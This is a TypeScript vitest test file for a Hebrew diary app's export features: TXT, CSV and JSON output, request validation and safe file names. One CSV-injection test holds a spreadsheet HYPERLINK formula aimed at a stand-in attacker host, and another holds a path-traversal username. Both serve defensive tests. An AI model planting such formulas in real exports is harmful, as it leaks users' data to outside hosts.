import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { APP_NAME, APP_VERSION } from '@shared/constants';
import type { UserProfile } from '@shared/types';
import { DiaryDb } from '../src/db/database';
import {
  CSV_HEADER,
  buildJsonDocument,
  collectExportData,
  contentDispositionAttachment,
  csvEscape,
  exportCsv,
  exportData,
  exportFileName,
  exportJson,
  exportTxt,
  safeFileNamePart,
  validateExportRequest,
  type ExportData,
} from '../src/export/index';
import { TXT_SEPARATOR } from '../src/export/txt';
import { weekdayName } from '../src/util/dates';
import { seedHebrewEntries, seedWalkingHabit } from './export-fixtures.test';
import { cleanupTempDirs, TEST_ACCOUNT, testConfig } from './helpers';
import { toUserProfile } from '../src/security/session-types';

const user: UserProfile = toUserProfile(TEST_ACCOUNT);

// `testConfig()` creates a temporary data directory; remove them when the file is done.
afterAll(cleanupTempDirs);
const HEBREW = /[\u0590-\u05FF]/;

/** Minimal RFC 4180 parser (CRLF records, quoted fields with doubled quotes). */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = '';
  let inQuotes = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (inQuotes) {
      if (c === '"') {
        if (text[i + 1] === '"') {
          field += '"';
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        field += c;
      }
    } else if (c === '"') {
      inQuotes = true;
    } else if (c === ',') {
      row.push(field);
      field = '';
    } else if (c === '\r' && text[i + 1] === '\n') {
      row.push(field);
      rows.push(row);
      row = [];
      field = '';
      i++;
    } else {
      field += c;
    }
  }
  if (field !== '' || row.length) {
    row.push(field);
    rows.push(row);
  }
  return rows;
}

describe('export data loading', () => {
  let db: DiaryDb;
  beforeAll(async () => {
    db = await DiaryDb.create();
    seedHebrewEntries(db);
    seedWalkingHabit(db);
  });
  afterAll(() => db.close());

  it('loads all entries ascending by date and time when the range is unbounded', () => {
    const data = collectExportData(db, { format: 'txt' }, user, 'he');
    expect(data.entries.map((e) => `${e.date} ${e.time}`)).toEqual([
      '2026-09-05 21:30',
      '2026-09-06 08:15',
      '2026-09-06 22:00',
      '2026-09-07 19:45',
    ]);
    expect(data.from).toBeNull();
    expect(data.to).toBeNull();
    expect(data.includeHabits).toBe(false);
    expect(data.habits).toEqual([]);
    expect(data.habitLogs).toEqual([]);
  });

  it('maps rows to the shared Entry shape with null for unreported values', () => {
    const data = collectExportData(db, { format: 'json' }, user, 'he');
    const full = data.entries[0];
    expect(full.title).toBe('יום רגיל');
    expect(full.emotions).toEqual(['calm', 'satisfied']);
    expect(full.sleepHours).toBe(7.5);
    expect(full.tags).toEqual(['עבודה']);
    expect(typeof full.id).toBe('number');
    expect(full.createdAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
    const empty = data.entries[2];
    expect(empty.mood).toBeNull();
    expect(empty.exerciseMinutes).toBeNull();
    expect(empty.emotions).toEqual([]);
    const zeroExercise = data.entries[3];
    expect(zeroExercise.exerciseMinutes).toBe(0);
  });

  it('honours inclusive from/to bounds (either side may be open)', () => {
    expect(collectExportData(db, { format: 'txt', from: '2026-09-06', to: '2026-09-06' }, user, 'he').entries).toHaveLength(2);
    expect(collectExportData(db, { format: 'txt', from: '2026-09-07' }, user, 'he').entries).toHaveLength(1);
    expect(collectExportData(db, { format: 'txt', to: '2026-09-05' }, user, 'he').entries).toHaveLength(1);
    expect(collectExportData(db, { format: 'txt', from: '2027-01-01' }, user, 'he').entries).toHaveLength(0);
  });

  it('loads habits and the logs inside the range when includeHabits is set', () => {
    const data = collectExportData(db, { format: 'txt', includeHabits: true, from: '2026-09-06' }, user, 'he');
    expect(data.habits).toHaveLength(1);
    expect(data.habits[0].name).toBe('הליכה');
    expect(data.habitLogs.map((l) => l.date)).toEqual(['2026-09-06', '2026-09-07']);
    expect(data.habitLogs[0].completed).toBe(false);
    expect(data.habitLogs[0].note).toBe('קצר');
  });
});

describe('TXT export', () => {
  let db: DiaryDb;
  let plain: ExportData;
  let withHabits: ExportData;
  beforeAll(async () => {
    db = await DiaryDb.create();
    seedHebrewEntries(db);
    seedWalkingHabit(db);
    plain = collectExportData(db, { format: 'txt', from: '2026-09-01', to: '2026-09-30' }, user, 'he');
    withHabits = collectExportData(db, { format: 'txt', includeHabits: true }, user, 'he');
  });
  afterAll(() => db.close());

  it('has a Hebrew header block, no BOM and CRLF line endings', () => {
    const text = exportTxt(plain).toString('utf8');
    expect(text.charCodeAt(0)).not.toBe(0xfeff);
    expect(text.startsWith(APP_NAME)).toBe(true);
    expect(text).toContain('שם: דנה כהן (tester)');
    expect(text).toContain('טווח: 1.9.2026 - 30.9.2026');
    expect(text).toContain('תאריך הייצוא: ');
    expect(text).toContain('מספר רשומות: 4');
    expect(text).toContain('\r\n');
    expect(text.replace(/\r\n/g, '')).not.toContain('\n');
  });

  it('prints every entry with Hebrew labels and values separated by rule lines', () => {
    const text = exportTxt(plain).toString('utf8');
    expect(text.split(TXT_SEPARATOR).length).toBe(plain.entries.length + 2);
    expect(text).toContain(`תאריך: 5.9.2026 (יום ${weekdayName('2026-09-05')})  שעה: 21:30`);
    expect(text).toContain('כותרת: יום רגיל');
    expect(text).toContain('מצב רוח: 7/10 | אנרגיה: 6/10 | לחץ: 3/10 | איכות שינה: 7/10 | שעות שינה: 7.5');
    expect(text).toContain('רגשות: רגוע, מרוצה');
    expect(text).toContain('פעילות גופנית: 30 דקות (הליכה)');
    expect(text).toContain('אירועים: פגישה בעבודה');
    expect(text).toContain('אנשים: דנה');
    expect(text).toContain('מקום: בית');
    expect(text).toContain('הרגשתי טוב היום, הלכתי ברגל ופגשתי את דנה.');
    expect(text).toContain('תגיות: #עבודה');
    expect(text).toContain('תגיות: #בריאות #עבודה');
    expect(text).toContain('אנשים: יוסי, רונית');
    // Multi-line body keeps its lines (CRLF).
    expect(text).toContain('ישנתי 7.5 שעות אבל קמתי עייף.\r\nשורה שנייה, עם פסיק.');
  });

  it('shows unreported values as an em dash and 0 minutes as 0', () => {
    const text = exportTxt(plain).toString('utf8');
    expect(text).toContain('מצב רוח: — | אנרגיה: — | לחץ: — | איכות שינה: — | שעות שינה: —');
    expect(text).toContain('כותרת: —');
    expect(text).toContain('רגשות: —');
    expect(text).toContain('פעילות גופנית: —');
    expect(text).toContain('פעילות גופנית: 0 דקות');
    expect(text).toContain('הערות: —');
    expect(text).toContain('תגיות: —');
  });

  it('appends a habits section only when includeHabits is set', () => {
    const without = exportTxt(plain).toString('utf8');
    expect(without).not.toContain('הרגלים');
    const text = exportTxt(withHabits).toString('utf8');
    expect(text).toContain('הרגלים');
    expect(text).toContain('הליכה (יעד: 30 דקות ביום)');
    expect(text).toContain('הליכה יומית באוויר הפתוח');
    expect(text).toContain('5.9.2026: 30 דקות (הושלם)');
    expect(text).toContain('6.9.2026: 15 דקות - קצר');
    expect(text).toContain('7.9.2026: 45 דקות (הושלם)');
  });

  it('describes open ranges and an empty diary in Hebrew', async () => {
    const emptyDb = await DiaryDb.create();
    const data = collectExportData(emptyDb, { format: 'txt' }, user, 'he');
    const text = exportTxt(data).toString('utf8');
    expect(text).toContain('טווח: כל התקופה');
    expect(text).toContain('מספר רשומות: 0');
    expect(text).toContain('אין רשומות בטווח שנבחר');
    const fromOnly = collectExportData(emptyDb, { format: 'txt', from: '2026-01-01' }, user, 'he');
    expect(exportTxt(fromOnly).toString('utf8')).toContain('טווח: מ-1.1.2026 עד היום');
    emptyDb.close();
  });
});

describe('CSV export', () => {
  let db: DiaryDb;
  let data: ExportData;
  beforeAll(async () => {
    db = await DiaryDb.create();
    seedHebrewEntries(db);
    seedWalkingHabit(db);
    data = collectExportData(db, { format: 'csv' }, user, 'he');
  });
  afterAll(() => db.close());

  it('starts with a UTF-8 BOM, uses CRLF and has a 17-column Hebrew header', () => {
    const bytes = exportCsv(data);
    expect([bytes[0], bytes[1], bytes[2]]).toEqual([0xef, 0xbb, 0xbf]);
    const text = bytes.toString('utf8');
    expect(text.charCodeAt(0)).toBe(0xfeff);
    // Records are separated by CRLF only (a line break inside a quoted field stays a bare LF,
    // see the RFC 4180 test below), so splitting on CRLF yields one piece per record plus the
    // empty piece after the trailing CRLF. No bare CR anywhere.
    expect(text.split('\r\n')).toHaveLength(1 + data.entries.length + 1);
    expect(text).not.toMatch(/\r(?!\n)/);
    expect(text.endsWith('\r\n')).toBe(true);
    const rows = parseCsv(text.slice(1));
    expect(rows[0]).toHaveLength(17);
    expect(rows[0]).toEqual([...CSV_HEADER]);
    expect(rows[0][0]).toBe('תאריך');
    expect(rows[0][16]).toBe('טקסט');
    expect(rows).toHaveLength(1 + data.entries.length);
  });

  it('quotes fields containing commas, quotes or newlines (RFC 4180)', () => {
    const text = exportCsv(data).toString('utf8').slice(1);
    // Raw text: the multi-line body with a comma must be wrapped in quotes and the quote doubled.
    expect(text).toContain('"ישנתי 7.5 שעות אבל קמתי עייף.\nשורה שנייה, עם פסיק."');
    expect(text).toContain('"הערה עם ""מרכאות"""');
    const rows = parseCsv(text);
    const hard = rows[2];
    expect(hard).toHaveLength(17);
    expect(hard[0]).toBe('2026-09-06');
    expect(hard[1]).toBe('08:15');
    expect(hard[2]).toBe('בוקר קשה');
    expect(hard[3]).toBe('4');
    expect(hard[4]).toBe('עייף; לחוץ');
    expect(hard[12]).toBe('יוסי; רונית');
    expect(hard[14]).toBe('הערה עם "מרכאות"');
    expect(hard[15]).toBe('בריאות; עבודה');
    expect(hard[16]).toBe('ישנתי 7.5 שעות אבל קמתי עייף.\nשורה שנייה, עם פסיק.');
  });

  it('writes empty cells for unreported values and keeps explicit zeros', () => {
    const rows = parseCsv(exportCsv(data).toString('utf8').slice(1));
    const empty = rows[3];
    expect(empty[0]).toBe('2026-09-06');
    expect(empty.slice(2)).toEqual(Array(15).fill(''));
    const zero = rows[4];
    expect(zero[9]).toBe('0');
    expect(zero[8]).toBe('8');
    expect(zero[11]).toBe('ארוחה משפחתית');
    const first = rows[1];
    expect(first[8]).toBe('7.5');
    expect(first[9]).toBe('30');
    expect(first[10]).toBe('הליכה');
  });

  it('ignores includeHabits so the file stays a single table', () => {
    const withHabits = collectExportData(db, { format: 'csv', includeHabits: true }, user, 'he');
    expect(exportCsv(withHabits).equals(exportCsv(data))).toBe(true);
  });

  it('csvEscape follows RFC 4180', () => {
    expect(csvEscape('')).toBe('');
    expect(csvEscape('שלום')).toBe('שלום');
    expect(csvEscape('a,b')).toBe('"a,b"');
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscape('line\nbreak')).toBe('"line\nbreak"');
  });

  it('csvEscape neutralises cells a spreadsheet would run as a formula (CSV injection)', () => {
    expect(csvEscape('=HYPERLINK("http://attacker.example/?x="&A1,"click")')).toBe(
      `"'=HYPERLINK(""http://attacker.example/?x=""&A1,""click"")"`,
    );
    expect(csvEscape('- went running')).toBe("'- went running");
    expect(csvEscape('+972 phone')).toBe("'+972 phone");
    expect(csvEscape('@SUM(1+1)')).toBe("'@SUM(1+1)");
    expect(csvEscape('\tcell')).toBe("'\tcell");
    // Ordinary text and numbers are unchanged.
    expect(csvEscape('went - running')).toBe('went - running');
    expect(csvEscape('7.5')).toBe('7.5');
  });
});

describe('JSON export', () => {
  let db: DiaryDb;
  beforeAll(async () => {
    db = await DiaryDb.create();
    seedHebrewEntries(db);
    seedWalkingHabit(db);
  });
  afterAll(() => db.close());

  it('is pretty-printed UTF-8 JSON with app, user, range and entries', () => {
    const data = collectExportData(db, { format: 'json', from: '2026-09-06', to: '2026-09-07' }, user, 'he');
    const bytes = exportJson(data);
    expect(bytes[0]).toBe('{'.charCodeAt(0));
    const text = bytes.toString('utf8');
    expect(text).toContain('\n  "app": ');
    const parsed = JSON.parse(text);
    expect(parsed.app).toBe(APP_NAME);
    expect(parsed.version).toBe(APP_VERSION);
    expect(parsed.exportedAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
    expect(parsed.user).toEqual({ username: 'tester', firstName: 'דנה', lastName: 'כהן' });
    expect(parsed.range).toEqual({ from: '2026-09-06', to: '2026-09-07' });
    expect(parsed.entries).toHaveLength(3);
    expect(parsed.entries[0].title).toBe('בוקר קשה');
    expect(parsed.entries[0].emotions).toEqual(['tired', 'stressed']);
    expect(parsed.entries[1].mood).toBeNull();
    expect(parsed.habits).toBeUndefined();
    expect(parsed.habitLogs).toBeUndefined();
  });

  it('adds habits and habitLogs when requested and uses null for open bounds', () => {
    const data = collectExportData(db, { format: 'json', includeHabits: true }, user, 'he');
    const doc = buildJsonDocument(data);
    expect(doc.range).toEqual({ from: null, to: null });
    expect(doc.habits).toHaveLength(1);
    expect(doc.habits?.[0]).toMatchObject({ name: 'הליכה', target: 30, unit: 'דקות', frequency: 'daily', isArchived: false });
    expect(doc.habitLogs).toHaveLength(3);
    expect(doc.habitLogs?.[0]).toMatchObject({ date: '2026-09-05', value: 30, completed: true, note: '' });
    const parsed = JSON.parse(exportJson(data).toString('utf8'));
    expect(parsed.habitLogs[1].note).toBe('קצר');
  });
});

describe('validateExportRequest', () => {
  it('accepts a full request and normalises optional fields', () => {
    const req = validateExportRequest({
      format: 'pdf',
      from: '2026-01-01',
      to: '2026-03-31',
      includeHabits: true,
      destPath: 'C:\\Users\\me\\Documents\\diary.pdf',
    });
    expect(req).toEqual({
      format: 'pdf',
      from: '2026-01-01',
      to: '2026-03-31',
      includeHabits: true,
      destPath: 'C:\\Users\\me\\Documents\\diary.pdf',
    });
    expect(validateExportRequest({ format: 'txt', from: '', to: null, destPath: '  ' })).toEqual({ format: 'txt' });
  });

  it('rejects invalid input with Hebrew messages and field names', () => {
    const expectValidation = (body: unknown, field?: string) => {
      try {
        validateExportRequest(body);
      } catch (e) {
        const err = e as { status: number; code: string; message: string; field?: string; messageFor: (l: 'he') => string };
        expect(err.status).toBe(400);
        expect(err.code).toBe('VALIDATION');
        expect(err.messageFor('he')).toMatch(HEBREW);
        if (field) expect(err.field).toBe(field);
        return;
      }
      throw new Error('expected a validation error');
    };
    expectValidation(undefined);
    expectValidation('txt');
    expectValidation({}, 'format');
    expectValidation({ format: 'docx' }, 'format');
    expectValidation({ format: 'txt', from: '2026-13-01' }, 'from');
    expectValidation({ format: 'txt', to: '07/09/2026' }, 'to');
    expectValidation({ format: 'txt', from: '2026-09-08', to: '2026-09-01' }, 'from');
    expectValidation({ format: 'txt', includeHabits: 'yes' }, 'includeHabits');
    expectValidation({ format: 'txt', destPath: 'relative/diary.txt' }, 'destPath');
    expectValidation({ format: 'txt', destPath: 42 });
  });
});

describe('file names and download headers', () => {
  it('builds your-personal-diary-<username>-<from>_<to>.<ext> with safe characters', () => {
    expect(exportFileName('tester', 'pdf', '2026-01-01', '2026-03-31')).toBe('your-personal-diary-tester-2026-01-01_2026-03-31.pdf');
    expect(exportFileName('דנה כהן!', 'csv', '2026-01-01', '2026-01-31')).toBe('your-personal-diary-דנה_כהן-2026-01-01_2026-01-31.csv');
    expect(exportFileName('../evil/name', 'txt', '2026-01-01', '2026-01-31')).toBe('your-personal-diary-evil_name-2026-01-01_2026-01-31.txt');
    expect(safeFileNamePart('***')).toBe('user');
    expect(safeFileNamePart('a.b-c_d')).toBe('a.b-c_d');
  });

  it('produces an ASCII fallback plus an RFC 5987 UTF-8 filename*', () => {
    const cd = contentDispositionAttachment('your-personal-diary-דנה-2026-01-01_2026-01-31.pdf');
    expect(cd.startsWith('attachment; filename="your-personal-diary-___-2026-01-01_2026-01-31.pdf"; ')).toBe(true);
    expect(cd).toContain("filename*=UTF-8''your-personal-diary-%D7%93%D7%A0%D7%94-2026-01-01_2026-01-31.pdf");
    // eslint-disable-next-line no-control-regex
    expect(cd).not.toMatch(/[^\x20-\x7e]/);
    expect(contentDispositionAttachment('plain.txt')).toBe("attachment; filename=\"plain.txt\"; filename*=UTF-8''plain.txt");
    expect(contentDispositionAttachment("it's (1).txt")).toContain("filename*=UTF-8''it%27s%20%281%29.txt");
  });
});

describe('exportData dispatch', () => {
  let db: DiaryDb;
  beforeAll(async () => {
    db = await DiaryDb.create();
    seedHebrewEntries(db);
  });
  afterAll(() => db.close());

  it('returns bytes, mime, file name and the number of exported entries', async () => {
    const ctx = { user, assetsDir: testConfig().assetsDir, locale: 'he' as const };
    const txt = await exportData(db, { format: 'txt', from: '2026-09-06', to: '2026-09-07' }, ctx);
    expect(txt.mime).toBe('text/plain; charset=utf-8');
    expect(txt.fileName).toBe('your-personal-diary-tester-2026-09-06_2026-09-07.txt');
    expect(txt.entriesExported).toBe(3);
    expect(txt.bytes.toString('utf8')).toContain('כותרת: בוקר קשה');

    const csv = await exportData(db, { format: 'csv' }, ctx);
    expect(csv.mime).toBe('text/csv; charset=utf-8');
    // Open bounds: first entry date .. today.
    expect(csv.fileName).toMatch(/^your-personal-diary-tester-2026-09-05_\d{4}-\d{2}-\d{2}\.csv$/);
    expect(csv.entriesExported).toBe(4);

    const json = await exportData(db, { format: 'json', includeHabits: true }, ctx);
    expect(json.mime).toBe('application/json; charset=utf-8');
    expect(JSON.parse(json.bytes.toString('utf8')).habits).toEqual([]);
  });

  it('rejects an unknown format even when validation was skipped', async () => {
    const ctx = { user, assetsDir: testConfig().assetsDir, locale: 'he' as const };
    await expect(exportData(db, { format: 'xml' as never }, ctx)).rejects.toMatchObject({ status: 400, code: 'VALIDATION', field: 'format' });
  });
});
